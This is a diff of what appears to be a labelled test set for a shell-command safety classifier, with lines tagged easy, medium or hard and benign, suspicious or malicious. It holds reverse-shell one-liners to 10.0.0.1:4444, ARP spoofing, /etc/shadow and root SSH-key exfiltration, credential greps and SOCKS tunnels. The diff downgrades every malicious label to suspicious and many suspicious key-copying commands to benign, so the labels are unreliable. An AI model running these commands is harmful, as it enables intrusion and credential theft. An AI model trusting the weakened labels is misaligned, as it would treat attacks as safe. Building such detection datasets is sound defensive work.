@@ -127,10 +127,10 @@ medium|benign|kubectl rollout status deploy/web
 medium|benign|kubectl cp web-0:/var/log/app.log ./app.log
 medium|benign|openssl s_client -connect internal-api.company.local:443 -servername internal-api.company.local </dev/null
 medium|benign|openssl x509 -in /etc/ssl/certs/company.pem -text -noout
-medium|suspicious|strace -p $(pgrep nginx) -e trace=network -o /tmp/nginx.trace
-medium|suspicious|ltrace -p $(pgrep postgres) -o /tmp/postgres.ltrace
+medium|benign|strace -p $(pgrep nginx) -e trace=network -o /tmp/nginx.trace
+medium|benign|ltrace -p $(pgrep postgres) -o /tmp/postgres.ltrace
 medium|benign|gdb -batch -p $(pgrep app-server) -ex "thread apply all bt"
-medium|suspicious|tcpdump -i eth0 -c 50 port 443
+medium|benign|tcpdump -i eth0 -c 50 port 443
 medium|benign|python3 -m http.server 127.0.0.1 8080 --directory /srv/app/build
 medium|benign|systemctl cat nginx
 medium|benign|journalctl -u nginx --since today | tail -50
@@ -152,7 +152,7 @@ medium|benign|tar czf /var/backups/app-current.tar.gz /srv/app/current
 medium|benign|tar tzf /var/backups/app-current.tar.gz | head -20
 medium|benign|tar czf /var/backups/dev-config.tar.gz /home/dev/.config
 medium|benign|tar tzf /var/backups/dev-config.tar.gz | head -20
-medium|suspicious|tar czf /var/backups/ssh-config.tar.gz /etc/ssh
+medium|benign|tar czf /var/backups/ssh-config.tar.gz /etc/ssh
 medium|benign|tar tzf /var/backups/ssh-config.tar.gz | head -20
 medium|benign|tar czf /var/backups/app-logs.tar.gz /var/log/app
 medium|benign|tar tzf /var/backups/app-logs.tar.gz | head -20
@@ -175,14 +175,23 @@ medium|benign|kubectl logs daemonset/log-agent --tail=100
 medium|benign|curl -fsSL https://repo.company.local/cli/linux-amd64.tar.gz -o /tmp/cli.tar.gz
 medium|benign|wget -q https://repo.company.local/cli/linux-amd64.tar.gz -O /tmp/cli.tar.gz
 medium|benign|file /tmp/cli.tar.gz
+medium|benign|sha256sum /tmp/cli.tar.gz
 medium|benign|curl -fsSL https://mirror.internal/python-3.11.9.tgz -o /tmp/python.tgz
 medium|benign|wget -q https://mirror.internal/python-3.11.9.tgz -O /tmp/python.tgz
+medium|benign|file /tmp/python.tgz
+medium|benign|sha256sum /tmp/python.tgz
 medium|benign|curl -fsSL https://artifacts.company.local/ops/tool.deb -o /tmp/tool.deb
 medium|benign|wget -q https://artifacts.company.local/ops/tool.deb -O /tmp/tool.deb
+medium|benign|file /tmp/tool.deb
+medium|benign|sha256sum /tmp/tool.deb
 medium|benign|curl -fsSL https://packages.redhat.com/repodata/repomd.xml -o /tmp/repomd.xml
 medium|benign|wget -q https://packages.redhat.com/repodata/repomd.xml -O /tmp/repomd.xml
+medium|benign|file /tmp/repomd.xml
+medium|benign|sha256sum /tmp/repomd.xml
 medium|benign|curl -fsSL https://cdn.kernel.org/pub/linux/kernel/v6.x/sha256sums.asc -o /tmp/kernel-sums.asc
 medium|benign|wget -q https://cdn.kernel.org/pub/linux/kernel/v6.x/sha256sums.asc -O /tmp/kernel-sums.asc
+medium|benign|file /tmp/kernel-sums.asc
+medium|benign|sha256sum /tmp/kernel-sums.asc
 medium|benign|systemctl daemon-reload
 medium|benign|systemctl restart app
 medium|benign|systemctl reload postgresql
@@ -195,46 +204,46 @@ medium|benign|openssl rsa -in /etc/ssl/private/server.key -check -noout
 medium|benign|tar czf /tmp/release-artifacts.tgz /srv/releases/current /etc/systemd/system/app.service
 
 # --- HARD (benign) ---
-hard|suspicious|ssh -L 8443:internal-api.company.local:443 bastion@10.0.0.10
-hard|suspicious|ssh -L 5432:db.internal:5432 dba@10.0.0.11
-hard|suspicious|ssh -D 1080 support@10.0.0.12
+hard|benign|ssh -L 8443:internal-api.company.local:443 bastion@10.0.0.10
+hard|benign|ssh -L 5432:db.internal:5432 dba@10.0.0.11
+hard|benign|ssh -D 1080 support@10.0.0.12
 hard|benign|scp /etc/ssl/certs/company.pem audit@10.0.0.50:/srv/cert-audit/
 hard|benign|rsync -avz /var/log/ auth@10.0.0.60:/srv/forensics/host-logs/
-hard|suspicious|tcpdump -i eth0 -c 100 host 10.0.0.20 and port 443 -w /tmp/tls-debug.pcap
-hard|suspicious|strace -f -p $(pgrep java) -e trace=network -o /tmp/java-net.trace
+hard|benign|tcpdump -i eth0 -c 100 host 10.0.0.20 and port 443 -w /tmp/tls-debug.pcap
+hard|benign|strace -f -p $(pgrep java) -e trace=network -o /tmp/java-net.trace
 hard|benign|gdb -batch -p $(pgrep redis-server) -ex "info threads" -ex "thread apply all bt"
-hard|suspicious|ltrace -p $(pgrep nginx) -o /tmp/nginx-debug.ltrace
+hard|benign|ltrace -p $(pgrep nginx) -o /tmp/nginx-debug.ltrace
 hard|benign|find /srv/app -name "*.pem" -type f
-hard|suspicious|find /etc -name "*.key" -type f
-hard|suspicious|find /home/dev -name "id_rsa" -type f
-hard|suspicious|tar czf /tmp/incident-artifacts.tar.gz /var/log/app /etc/nginx /srv/app/current/config
+hard|benign|find /etc -name "*.key" -type f
+hard|benign|find /home/dev -name "id_rsa" -type f
+hard|benign|tar czf /tmp/incident-artifacts.tar.gz /var/log/app /etc/nginx /srv/app/current/config
 hard|benign|openssl s_client -connect postgres.internal:5432 -starttls postgres </dev/null
 hard|benign|openssl s_client -connect smtp.internal:25 -starttls smtp </dev/null
-hard|suspicious|python3 -m http.server 0.0.0.0 9000 --directory /srv/releases/current
-hard|suspicious|socat TCP-LISTEN:9000,reuseaddr,fork FILE:/srv/releases/current/app.tar.gz,rdonly
+hard|benign|python3 -m http.server 0.0.0.0 9000 --directory /srv/releases/current
+hard|benign|socat TCP-LISTEN:9000,reuseaddr,fork FILE:/srv/releases/current/app.tar.gz,rdonly
 hard|benign|docker cp web:/var/log/app.log ./web-app.log
 hard|benign|kubectl exec deploy/web -- sh -c "tar cz /var/log/app" > /tmp/web-logs.tar.gz
 hard|benign|journalctl --since yesterday | grep -i ssl | tail -100
-hard|suspicious|strace -tt -p $(pgrep nginx) -o /tmp/nginx.strace
+hard|benign|strace -tt -p $(pgrep nginx) -o /tmp/nginx.strace
 hard|benign|gdb -batch -p $(pgrep nginx) -ex "bt"
-hard|suspicious|strace -tt -p $(pgrep postgres) -o /tmp/postgres.strace
+hard|benign|strace -tt -p $(pgrep postgres) -o /tmp/postgres.strace
 hard|benign|gdb -batch -p $(pgrep postgres) -ex "bt"
-hard|suspicious|strace -tt -p $(pgrep redis-server) -o /tmp/redis-server.strace
+hard|benign|strace -tt -p $(pgrep redis-server) -o /tmp/redis-server.strace
 hard|benign|gdb -batch -p $(pgrep redis-server) -ex "bt"
-hard|suspicious|strace -tt -p $(pgrep dockerd) -o /tmp/dockerd.strace
+hard|benign|strace -tt -p $(pgrep dockerd) -o /tmp/dockerd.strace
 hard|benign|gdb -batch -p $(pgrep dockerd) -ex "bt"
-hard|suspicious|strace -tt -p $(pgrep java) -o /tmp/java.strace
+hard|benign|strace -tt -p $(pgrep java) -o /tmp/java.strace
 hard|benign|gdb -batch -p $(pgrep java) -ex "bt"
-hard|suspicious|strace -tt -p $(pgrep python3) -o /tmp/python3.strace
+hard|benign|strace -tt -p $(pgrep python3) -o /tmp/python3.strace
 hard|benign|gdb -batch -p $(pgrep python3) -ex "bt"
-hard|suspicious|rsync -avz /etc/ssh audit@10.0.0.70:/srv/review/ssh/
-hard|suspicious|tar cz /etc/ssh | ssh audit@10.0.0.70 "cat > /srv/staging/ssh.tgz"
-hard|suspicious|rsync -avz /srv/app/current/config ops@10.0.0.80:/srv/review/config/
-hard|suspicious|tar cz /srv/app/current/config | ssh ops@10.0.0.80 "cat > /srv/staging/config.tgz"
+hard|benign|rsync -avz /etc/ssh audit@10.0.0.70:/srv/review/ssh/
+hard|benign|tar cz /etc/ssh | ssh audit@10.0.0.70 "cat > /srv/staging/ssh.tgz"
+hard|benign|rsync -avz /srv/app/current/config ops@10.0.0.80:/srv/review/config/
+hard|benign|tar cz /srv/app/current/config | ssh ops@10.0.0.80 "cat > /srv/staging/config.tgz"
 hard|benign|rsync -avz /var/log/app backup@10.0.0.90:/srv/incident/app-logs/
 hard|benign|tar cz /var/log/app | ssh backup@10.0.0.90 "cat > /srv/staging/app.tgz"
-hard|suspicious|rsync -avz /home/dev/.ssh backup@10.0.0.91:/srv/incident/dev-ssh/
-hard|suspicious|tar cz /home/dev/.ssh | ssh backup@10.0.0.91 "cat > /srv/staging/.ssh.tgz"
+hard|benign|rsync -avz /home/dev/.ssh backup@10.0.0.91:/srv/incident/dev-ssh/
+hard|benign|tar cz /home/dev/.ssh | ssh backup@10.0.0.91 "cat > /srv/staging/.ssh.tgz"
 hard|benign|rsync -avz /etc/systemd/system ops@10.0.0.92:/srv/incident/systemd/
 hard|benign|tar cz /etc/systemd/system | ssh ops@10.0.0.92 "cat > /srv/staging/system.tgz"
 hard|benign|chown -R app:app /srv/app/current
@@ -249,42 +258,52 @@ hard|benign|chown -R deploy:deploy /srv/releases
 hard|benign|find /srv/releases -type f -exec chmod 640 {} +
 hard|benign|ssh -J bastion@10.0.0.10 dbadmin@10.0.0.15 "pg_dump --schema-only appdb" > /tmp/appdb-schema.sql
 hard|benign|scp ~/.ssh/known_hosts audit@10.0.0.55:/srv/ssh-baselines/
-hard|suspicious|rsync -avz /home/dev/.ssh/ backup@10.0.0.56:/srv/rotated-ssh-backups/
-hard|suspicious|tcpdump -i eth0 -G 60 -W 1 -w /tmp/one-minute.pcap port 443
-hard|suspicious|strace -ff -o /tmp/api.trace -p $(pgrep api-server)
+hard|benign|rsync -avz /home/dev/.ssh/ backup@10.0.0.56:/srv/rotated-ssh-backups/
+hard|benign|tcpdump -i eth0 -G 60 -W 1 -w /tmp/one-minute.pcap port 443
+hard|benign|strace -ff -o /tmp/api.trace -p $(pgrep api-server)
 hard|benign|gdb -batch -p $(pgrep java) -ex "set pagination off" -ex "generate-core-file /tmp/java.core"
 hard|benign|find /etc -name "*.pem" -o -name "*.crt"
 hard|benign|find /srv -name ".env" -type f
-hard|suspicious|kubectl exec deploy/api -- sh -c "tar cz /etc/ssl /app/config" > /tmp/api-config.tgz
-hard|suspicious|docker exec db sh -c "tar cz /var/lib/postgresql/data/base" > /tmp/db-base.tgz
+hard|benign|kubectl exec deploy/api -- sh -c "tar cz /etc/ssl /app/config" > /tmp/api-config.tgz
+hard|benign|docker exec db sh -c "tar cz /var/lib/postgresql/data/base" > /tmp/db-base.tgz
 hard|benign|openssl s_client -connect ldap.internal:636 -showcerts </dev/null
-hard|suspicious|python3 -m http.server 0.0.0.0 9443 --directory /srv/support-bundles
-hard|suspicious|socat TCP-LISTEN:9443,reuseaddr,fork FILE:/srv/support-bundles/current.tgz,rdonly
-hard|suspicious|ssh -R 9443:127.0.0.1:443 support@10.0.0.57
-hard|suspicious|ssh -D 9050 analyst@10.0.0.58
-hard|suspicious|rsync -avz /etc/kubernetes/ audit@10.0.0.59:/srv/k8s-audit/
-hard|malicious|tar czf /tmp/root-ssh-audit.tgz /root/.ssh 2>/dev/null
-hard|suspicious|find /home -name "id_ed25519" -type f 2>/dev/null
+hard|benign|python3 -m http.server 0.0.0.0 9443 --directory /srv/support-bundles
+hard|benign|socat TCP-LISTEN:9443,reuseaddr,fork FILE:/srv/support-bundles/current.tgz,rdonly
+hard|benign|ssh -R 9443:127.0.0.1:443 support@10.0.0.57
+hard|benign|ssh -D 9050 analyst@10.0.0.58
+hard|benign|rsync -avz /etc/kubernetes/ audit@10.0.0.59:/srv/k8s-audit/
+hard|benign|tar czf /tmp/root-ssh-audit.tgz /root/.ssh 2>/dev/null
+hard|benign|find /home -name "id_ed25519" -type f 2>/dev/null
 hard|benign|journalctl -u sshd --since yesterday > /tmp/sshd-yesterday.log
 hard|benign|curl -fsSL https://ifconfig.me -o /tmp/public-ip.txt
-hard|suspicious|tar czf /tmp/ssl-snapshot.tgz /etc/ssl 2>/dev/null
-hard|suspicious|rsync -avz /etc/ssl audit@10.0.0.99:/srv/audit/ssl/ 2>/dev/null
+hard|benign|tar czf /tmp/ssl-snapshot.tgz /etc/ssl 2>/dev/null
+hard|benign|rsync -avz /etc/ssl audit@10.0.0.99:/srv/audit/ssl/ 2>/dev/null
 hard|benign|find /etc/ssl -maxdepth 2 -type f 2>/dev/null | head -50
 hard|benign|tar czf /tmp/config-snapshot.tgz /srv/app/config 2>/dev/null
 hard|benign|rsync -avz /srv/app/config audit@10.0.0.99:/srv/audit/config/ 2>/dev/null
 hard|benign|find /srv/app/config -maxdepth 2 -type f 2>/dev/null | head -50
-hard|suspicious|tar czf /tmp/.ssh-snapshot.tgz /home/dev/.ssh 2>/dev/null
-hard|suspicious|rsync -avz /home/dev/.ssh audit@10.0.0.99:/srv/audit/.ssh/ 2>/dev/null
+hard|benign|tar czf /tmp/.ssh-snapshot.tgz /home/dev/.ssh 2>/dev/null
+hard|benign|rsync -avz /home/dev/.ssh audit@10.0.0.99:/srv/audit/.ssh/ 2>/dev/null
 hard|benign|find /home/dev/.ssh -maxdepth 2 -type f 2>/dev/null | head -50
 hard|benign|tar czf /tmp/nginx-snapshot.tgz /var/log/nginx 2>/dev/null
 hard|benign|rsync -avz /var/log/nginx audit@10.0.0.99:/srv/audit/nginx/ 2>/dev/null
 hard|benign|find /var/log/nginx -maxdepth 2 -type f 2>/dev/null | head -50
-hard|suspicious|tar czf /tmp/kubernetes-snapshot.tgz /etc/kubernetes 2>/dev/null
-hard|suspicious|rsync -avz /etc/kubernetes audit@10.0.0.99:/srv/audit/kubernetes/ 2>/dev/null
+hard|benign|tar czf /tmp/kubernetes-snapshot.tgz /etc/kubernetes 2>/dev/null
+hard|benign|rsync -avz /etc/kubernetes audit@10.0.0.99:/srv/audit/kubernetes/ 2>/dev/null
 hard|benign|find /etc/kubernetes -maxdepth 2 -type f 2>/dev/null | head -50
 hard|benign|ssh support@10.0.0.61 "journalctl -u app --since today | tail -100"
 hard|benign|ssh support@10.0.0.61 "tar cz /var/log/app" > /tmp/10.0.0.61-app-logs.tgz
-hard|suspicious|ssh support@10.0.0.61 "find /etc -name "*.pem" -type f"
+hard|benign|ssh support@10.0.0.61 "find /etc -name "*.pem" -type f"
+hard|benign|ssh support@10.0.0.62 "journalctl -u app --since today | tail -100"
+hard|benign|ssh support@10.0.0.62 "tar cz /var/log/app" > /tmp/10.0.0.62-app-logs.tgz
+hard|benign|ssh support@10.0.0.62 "find /etc -name "*.pem" -type f"
+hard|benign|ssh support@10.0.0.63 "journalctl -u app --since today | tail -100"
+hard|benign|ssh support@10.0.0.63 "tar cz /var/log/app" > /tmp/10.0.0.63-app-logs.tgz
+hard|benign|ssh support@10.0.0.63 "find /etc -name "*.pem" -type f"
+hard|benign|ssh support@10.0.0.64 "journalctl -u app --since today | tail -100"
+hard|benign|ssh support@10.0.0.64 "tar cz /var/log/app" > /tmp/10.0.0.64-app-logs.tgz
+hard|benign|ssh support@10.0.0.64 "find /etc -name "*.pem" -type f"
+hard|benign|ssh support@10.0.0.65 "journalctl -u app --since today | tail -100"
 
 # ===== SUSPICIOUS =====
 # --- EASY (suspicious) ---
@@ -303,6 +322,7 @@ easy|suspicious|grep -ri "password" /etc/ 2>/dev/null
 easy|suspicious|grep -ri "api_key" /home/ 2>/dev/null
 easy|suspicious|grep -ri "token" /srv/ 2>/dev/null
 easy|suspicious|find / -name "*.pem" 2>/dev/null
+easy|suspicious|find / -name "id_rsa" 2>/dev/null
 easy|suspicious|find / -writable -type d 2>/dev/null
 easy|suspicious|find / -perm -4000 -type f 2>/dev/null
 easy|suspicious|ls -la /root
@@ -328,6 +348,10 @@ easy|suspicious|mount -o remount,rw /
 easy|suspicious|python3 -m http.server 8080
 easy|suspicious|grep -ri "password" /etc 2>/dev/null | head -20
 easy|suspicious|find /etc -type f -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
+easy|suspicious|grep -ri "secret" /etc 2>/dev/null | head -20
+easy|suspicious|find /etc -type f -name "*.conf" -exec grep -l "secret" {} \; 2>/dev/null
+easy|suspicious|grep -ri "token" /etc 2>/dev/null | head -20
+easy|suspicious|find /etc -type f -name "*.conf" -exec grep -l "token" {} \; 2>/dev/null
 easy|suspicious|grep -ri "apikey" /srv 2>/dev/null | head -20
 easy|suspicious|find /srv -type f -name "*.conf" -exec grep -l "apikey" {} \; 2>/dev/null
 easy|suspicious|grep -ri "private_key" /home 2>/dev/null | head -20
@@ -342,41 +366,47 @@ easy|suspicious|ls -la /root 2>/dev/null
 easy|suspicious|find /root -maxdepth 2 -type f 2>/dev/null | head -20
 easy|suspicious|ls -la /root/.ssh 2>/dev/null
 easy|suspicious|find /root/.ssh -maxdepth 2 -type f 2>/dev/null | head -20
-easy|benign|ls -la /etc/ssh 2>/dev/null
+easy|suspicious|ls -la /etc/ssh 2>/dev/null
 easy|suspicious|find /etc/ssh -maxdepth 2 -type f 2>/dev/null | head -20
 easy|suspicious|ls -la /etc/cron.d 2>/dev/null
 easy|suspicious|find /etc/cron.d -maxdepth 2 -type f 2>/dev/null | head -20
 easy|suspicious|ls -la /dev/shm 2>/dev/null
 easy|suspicious|find /dev/shm -maxdepth 2 -type f 2>/dev/null | head -20
-easy|benign|ls -la /var/spool/cron 2>/dev/null
+easy|suspicious|ls -la /var/spool/cron 2>/dev/null
 easy|suspicious|find /var/spool/cron -maxdepth 2 -type f 2>/dev/null | head -20
-easy|benign|ls -la /home 2>/dev/null
+easy|suspicious|ls -la /home 2>/dev/null
 easy|suspicious|find /home -maxdepth 2 -type f 2>/dev/null | head -20
-easy|benign|ls -la /srv 2>/dev/null
-easy|benign|find /srv -maxdepth 2 -type f 2>/dev/null | head -20
+easy|suspicious|ls -la /srv 2>/dev/null
+easy|suspicious|find /srv -maxdepth 2 -type f 2>/dev/null | head -20
 easy|suspicious|cat /proc/version
-easy|benign|stat /proc/version
-easy|benign|cat /proc/cpuinfo
-easy|benign|stat /proc/cpuinfo
+easy|suspicious|stat /proc/version
+easy|suspicious|cat /proc/cpuinfo
+easy|suspicious|stat /proc/cpuinfo
 easy|suspicious|cat /proc/mounts
-easy|benign|stat /proc/mounts
+easy|suspicious|stat /proc/mounts
 easy|suspicious|cat /proc/net/route
-easy|benign|stat /proc/net/route
+easy|suspicious|stat /proc/net/route
 easy|suspicious|cat /proc/sys/kernel/randomize_va_space
 easy|suspicious|stat /proc/sys/kernel/randomize_va_space
 easy|suspicious|getent passwd
 easy|suspicious|getent group
 easy|suspicious|getent shadow
-easy|benign|ip neigh
-easy|benign|ip link show
+easy|suspicious|ip neigh
+easy|suspicious|ip link show
 easy|suspicious|find /home -name ".ssh" -type d 2>/dev/null
 easy|suspicious|find /srv -name ".env" 2>/dev/null
+easy|suspicious|grep -ri "aws_secret" /home/ 2>/dev/null
+easy|suspicious|grep -ri "BEGIN PRIVATE KEY" /etc/ 2>/dev/null
 easy|suspicious|cat /etc/sudoers 2>/dev/null
 easy|suspicious|cat /root/.ssh/authorized_keys 2>/dev/null
-easy|benign|docker ps -a
+easy|suspicious|docker ps -a
 easy|suspicious|kubectl get secrets -A
 easy|suspicious|kubectl auth can-i --list
 easy|suspicious|systemctl list-unit-files --state=enabled
+easy|suspicious|find / -name "*.ovpn" 2>/dev/null
+easy|suspicious|find / -name "*.kubeconfig" 2>/dev/null
+easy|suspicious|find / -name "known_hosts" 2>/dev/null
+easy|suspicious|grep -ri "passphrase" /home/ 2>/dev/null
 
 # --- MEDIUM (suspicious) ---
 medium|suspicious|curl -s http://192.168.1.100:8080/update.sh -o /tmp/update.sh
@@ -403,19 +433,32 @@ medium|suspicious|find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/nu
 medium|suspicious|nmap -sV 10.0.0.5
 medium|suspicious|nmap -O 10.0.0.5
 medium|suspicious|nmap -p 22,80,443,445 10.0.0.5
+medium|suspicious|nmap -sV 10.0.0.10
+medium|suspicious|nmap -O 10.0.0.10
+medium|suspicious|nmap -p 22,80,443,445 10.0.0.10
+medium|suspicious|nmap -sV 192.168.1.10
+medium|suspicious|nmap -O 192.168.1.10
+medium|suspicious|nmap -p 22,80,443,445 192.168.1.10
+medium|suspicious|nmap -sV 172.16.0.15
+medium|suspicious|nmap -O 172.16.0.15
+medium|suspicious|nmap -p 22,80,443,445 172.16.0.15
 medium|suspicious|nmap -sV db.internal
 medium|suspicious|nmap -O db.internal
 medium|suspicious|nmap -p 22,80,443,445 db.internal
 medium|suspicious|python3 -m http.server 4444
 medium|suspicious|nc -lvnp 4444
+medium|suspicious|socat TCP-LISTEN:4444,fork -
 medium|suspicious|python3 -m http.server 8080
 medium|suspicious|nc -lvnp 8080
 medium|suspicious|python3 -m http.server 9000
 medium|suspicious|nc -lvnp 9000
+medium|suspicious|socat TCP-LISTEN:9000,fork -
 medium|suspicious|python3 -m http.server 9443
 medium|suspicious|nc -lvnp 9443
+medium|suspicious|socat TCP-LISTEN:9443,fork -
 medium|suspicious|python3 -m http.server 1080
 medium|suspicious|nc -lvnp 1080
+medium|suspicious|socat TCP-LISTEN:1080,fork -
 medium|suspicious|curl -X POST http://10.0.0.5:9090/upload -d @/etc/hostname
 medium|suspicious|scp /etc/hostname audit@10.0.0.15:/tmp/
 medium|suspicious|curl -X POST http://10.0.0.5:9090/upload -d @/etc/os-release
@@ -427,21 +470,32 @@ medium|suspicious|scp /var/log/nginx/access.log audit@10.0.0.15:/tmp/
 medium|suspicious|curl -X POST http://10.0.0.5:9090/upload -d @/tmp/status.txt
 medium|suspicious|scp /tmp/status.txt audit@10.0.0.15:/tmp/
 medium|suspicious|systemctl list-timers --all
-medium|benign|ls -la /etc/systemd/system
+medium|suspicious|ls -la /etc/systemd/system
 medium|suspicious|find / -writable -type f 2>/dev/null
 medium|suspicious|find /var/www -name ".env" 2>/dev/null
 medium|suspicious|find /home -name "authorized_keys" 2>/dev/null
-medium|benign|journalctl --since "2 hours ago" | grep -i fail
-medium|benign|docker inspect $(docker ps -q | head -1)
+medium|suspicious|journalctl --since "2 hours ago" | grep -i fail
+medium|suspicious|docker inspect $(docker ps -q | head -1)
 medium|suspicious|kubectl get secrets -A
 medium|suspicious|kubectl auth can-i --list
 medium|suspicious|crontab -l -u root
 medium|suspicious|ssh -L 8443:127.0.0.1:443 user@10.0.0.1
+medium|suspicious|ssh -D 1080 -fNq user@10.0.0.5
+medium|suspicious|ssh -L 8443:127.0.0.1:443 user@10.0.0.5
+medium|suspicious|chisel client 10.0.0.5:8080 R:1080:socks
+medium|suspicious|ssh -D 1080 -fNq user@192.168.1.20
+medium|suspicious|ssh -L 8443:127.0.0.1:443 user@192.168.1.20
+medium|suspicious|chisel client 192.168.1.20:8080 R:1080:socks
+medium|suspicious|ssh -D 1080 -fNq user@172.16.0.50
+medium|suspicious|ssh -L 8443:127.0.0.1:443 user@172.16.0.50
+medium|suspicious|chisel client 172.16.0.50:8080 R:1080:socks
+medium|suspicious|ssh -D 1080 -fNq user@jump.internal
+medium|suspicious|ssh -L 8443:127.0.0.1:443 user@jump.internal
 medium|suspicious|chisel client jump.internal:8080 R:1080:socks
 medium|suspicious|tar czf /tmp/kube-secrets.tgz /etc/kubernetes 2>/dev/null
 medium|suspicious|tar czf /tmp/root-home.tgz /root 2>/dev/null
-medium|malicious|scp /etc/shadow audit@10.0.0.15:/tmp/ 2>/dev/null
-medium|malicious|rsync -avz /root/.ssh/ audit@10.0.0.15:/tmp/root-ssh/ 2>/dev/null
+medium|suspicious|scp /etc/shadow audit@10.0.0.15:/tmp/ 2>/dev/null
+medium|suspicious|rsync -avz /root/.ssh/ audit@10.0.0.15:/tmp/root-ssh/ 2>/dev/null
 medium|suspicious|python3 -m http.server 0.0.0.0 9000 --directory /tmp
 medium|suspicious|socat TCP-LISTEN:9000,reuseaddr,fork FILE:/etc/hostname,rdonly
 medium|suspicious|tcpdump -i eth0 port 22 -w /tmp/ssh.pcap
@@ -457,22 +511,22 @@ medium|suspicious|find / -perm -2000 -type f 2>/dev/null
 medium|suspicious|find / -name "*.pcap" 2>/dev/null
 
 # --- HARD (suspicious) ---
-hard|malicious|openssl s_client -quiet -connect 10.0.0.1:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445
-hard|malicious|socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
-hard|malicious|python3 -c "import pty; pty.spawn('/bin/bash')"
-hard|malicious|ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-hard|malicious|xterm -display 10.0.0.1:1 -e /bin/bash
+hard|suspicious|openssl s_client -quiet -connect 10.0.0.1:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445
+hard|suspicious|socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
+hard|suspicious|python3 -c "import pty; pty.spawn('/bin/bash')"
+hard|suspicious|ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+hard|suspicious|xterm -display 10.0.0.1:1 -e /bin/bash
 hard|suspicious|find / -perm -4000 -type f 2>/dev/null
 hard|suspicious|tcpdump -i eth0 -w /tmp/capture.pcap
-hard|malicious|ettercap -T -q -i eth0 -M arp:remote /10.0.0.1// /10.0.0.254//
-hard|malicious|arpspoof -i eth0 -t 10.0.0.1 10.0.0.254
-hard|malicious|responder -I eth0 -wrf
+hard|suspicious|ettercap -T -q -i eth0 -M arp:remote /10.0.0.1// /10.0.0.254//
+hard|suspicious|arpspoof -i eth0 -t 10.0.0.1 10.0.0.254
+hard|suspicious|responder -I eth0 -wrf
 hard|suspicious|mount -o remount,rw /
 hard|suspicious|chmod 777 /tmp/script.sh
 hard|suspicious|chisel client 10.0.0.1:8080 R:8443:127.0.0.1:443
 hard|suspicious|ssh -R 8080:127.0.0.1:22 user@10.0.0.1
 hard|suspicious|ssh -L 8443:10.0.0.20:443 user@10.0.0.1
-hard|malicious|tar cz /etc /var/log | curl -X PUT http://10.0.0.5:8080/upload --data-binary @-
+hard|suspicious|tar cz /etc /var/log | curl -X PUT http://10.0.0.5:8080/upload --data-binary @-
 hard|suspicious|tar czf /tmp/home-ssh.tar.gz /home/*/.ssh 2>/dev/null
 hard|suspicious|kubectl exec deploy/web -- sh -c "env | grep -i token"
 hard|suspicious|docker exec web sh -c "cat /proc/1/environ"
@@ -480,6 +534,17 @@ hard|suspicious|python3 -m http.server 0.0.0.0 8443 --directory /tmp
 hard|suspicious|ssh -D 1080 -fNq user@10.0.0.1
 hard|suspicious|ssh -R 9050:127.0.0.1:22 user@10.0.0.1
 hard|suspicious|chisel client 10.0.0.1:8080 R:1080:socks
+hard|suspicious|ssh -D 1080 -fNq user@10.0.0.5
+hard|suspicious|ssh -R 9050:127.0.0.1:22 user@10.0.0.5
+hard|suspicious|chisel client 10.0.0.5:8080 R:1080:socks
+hard|suspicious|ssh -D 1080 -fNq user@172.16.0.10
+hard|suspicious|ssh -R 9050:127.0.0.1:22 user@172.16.0.10
+hard|suspicious|chisel client 172.16.0.10:8080 R:1080:socks
+hard|suspicious|ssh -D 1080 -fNq user@192.168.1.50
+hard|suspicious|ssh -R 9050:127.0.0.1:22 user@192.168.1.50
+hard|suspicious|chisel client 192.168.1.50:8080 R:1080:socks
+hard|suspicious|ssh -D 1080 -fNq user@jump.internal
+hard|suspicious|ssh -R 9050:127.0.0.1:22 user@jump.internal
 hard|suspicious|chisel client jump.internal:8080 R:1080:socks
 hard|suspicious|tcpdump -i any -A | grep -i password
 hard|suspicious|tcpdump -i eth0 port 445 -w /tmp/smb.pcap
@@ -488,8 +553,8 @@ hard|suspicious|tshark -i eth0 -w /tmp/all.pcap
 hard|suspicious|tcpdump -i eth0 host 10.0.0.20 -w /tmp/host20.pcap
 hard|suspicious|tar czf /tmp/ssh-stage.tgz /etc/ssh 2>/dev/null
 hard|suspicious|rsync -avz /etc/ssh user@10.0.0.5:/tmp/stage/ 2>/dev/null
-hard|malicious|tar czf /tmp/.ssh-stage.tgz /root/.ssh 2>/dev/null
-hard|malicious|rsync -avz /root/.ssh user@10.0.0.5:/tmp/stage/ 2>/dev/null
+hard|suspicious|tar czf /tmp/.ssh-stage.tgz /root/.ssh 2>/dev/null
+hard|suspicious|rsync -avz /root/.ssh user@10.0.0.5:/tmp/stage/ 2>/dev/null
 hard|suspicious|tar czf /tmp/.ssh-stage.tgz /home/dev/.ssh 2>/dev/null
 hard|suspicious|rsync -avz /home/dev/.ssh user@10.0.0.5:/tmp/stage/ 2>/dev/null
 hard|suspicious|tar czf /tmp/postgresql-stage.tgz /var/lib/postgresql 2>/dev/null
@@ -509,8 +574,8 @@ hard|suspicious|rsync -avz /opt/secrets user@10.0.0.5:/tmp/stage/ 2>/dev/null
 hard|suspicious|python3 -c "import http.server,socketserver;socketserver.TCPServer(("0.0.0.0",8088),http.server.SimpleHTTPRequestHandler).serve_forever()"
 hard|suspicious|php -S 0.0.0.0:8089 -t /tmp
 hard|suspicious|openssl enc -aes-256-cbc -salt -in /etc/hostname -out /tmp/hostname.enc -k secret
-hard|malicious|tar cz /etc/ssh /root/.ssh 2>/dev/null | openssl enc -aes-256-cbc -k secret -out /tmp/ssh.enc
-hard|malicious|curl -X PUT http://10.0.0.5:8080/collect --data-binary @/tmp/ssh.enc
+hard|suspicious|tar cz /etc/ssh /root/.ssh 2>/dev/null | openssl enc -aes-256-cbc -k secret -out /tmp/ssh.enc
+hard|suspicious|curl -X PUT http://10.0.0.5:8080/collect --data-binary @/tmp/ssh.enc
 hard|suspicious|ssh -R 9000:127.0.0.1:22 support@10.0.0.1
 hard|suspicious|ssh -L 9443:10.0.0.20:443 support@10.0.0.1
